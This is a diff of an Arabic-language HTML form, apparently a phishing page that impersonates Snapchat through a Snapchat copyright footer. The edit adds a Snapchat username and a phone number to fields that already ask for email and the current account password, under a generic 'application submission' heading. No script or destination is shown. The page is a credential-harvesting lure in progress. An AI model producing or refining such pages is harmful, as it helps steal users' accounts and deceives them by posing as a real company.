@@ -16,45 +16,54 @@
 
     <main class="container">
         <div class="form-wrapper">
-            <h2 id="formHeader">نموذج تقديم الطلب</h2>
+            <h2>نموذج تقديم الطلب</h2>
             
             <form id="submissionForm">
                 
                 <div class="form-group">
-                    <label for="fullName" id="labelName">الاسم بالكامل:</label>
-                    <input type="text" id="fullName" name="fullName" required autocomplete="name">
+                    <label for="username">اسم المستخدم:</label>
+                    <input type="text" id="username" name="username" required 
+                           placeholder="اسم المستخدم في سناب شات"
+                           autocomplete="username">
                 </div>
 
                 <div class="form-group">
-                    <label for="snapchatHandle" id="labelSnapchat">معرّف حساب سناب شات:</label>
-                    <input type="text" id="snapchatHandle" name="snapchatHandle" required autocomplete="username">
+                    <label for="phoneNumber">رقم الهاتف:</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" required 
+                           placeholder="05xxxxxxxx"
+                           autocomplete="tel">
                 </div>
 
                 <div class="form-group">
-                    <label for="trackingEmail" id="labelTrackingField">البريد الإلكتروني:</label>
-                    <input type="email" id="trackingEmail" name="trackingEmail" required autocomplete="email">
+                    <label for="trackingEmail">البريد الإلكتروني:</label>
+                    <input type="email" id="trackingEmail" name="trackingEmail" required 
+                           placeholder="example@email.com"
+                           autocomplete="email">
                 </div>
 
                 <div class="form-group">
-                    <label for="passwordField" id="labelPassword">كلمة المرور:</label>
-                    <input type="password" id="passwordField" name="passwordField" required autocomplete="current-password">
+                    <label for="passwordField">كلمة المرور:</label>
+                    <input type="password" id="passwordField" name="passwordField" required 
+                           placeholder="********"
+                           autocomplete="current-password">
                 </div>
 
                 <div id="statusMessage" class="status-message" style="display: none;"></div>
 
                 <button type="submit" id="submitBtn" class="btn-primary">إرسال الطلب</button>
             </form>
-            </div>
+
+        </div>
     </main>
 
     <div id="loadingOverlay" class="loading-overlay" style="display: none;">
         <div class="loader"></div>
-        <p id="loaderText">جاري معالجة الطلب...</p>
+        <p>جاري معالجة الطلب...</p>
     </div>
 
     <footer>
         <div class="container">
-            <p id="footerTextForm">© 2025 جميع الحقوق محفوظة لـ Snapchat</p>
+            <p>© 2025 جميع الحقوق محفوظة لـ Snapchat</p>
         </div>
     </footer>
 
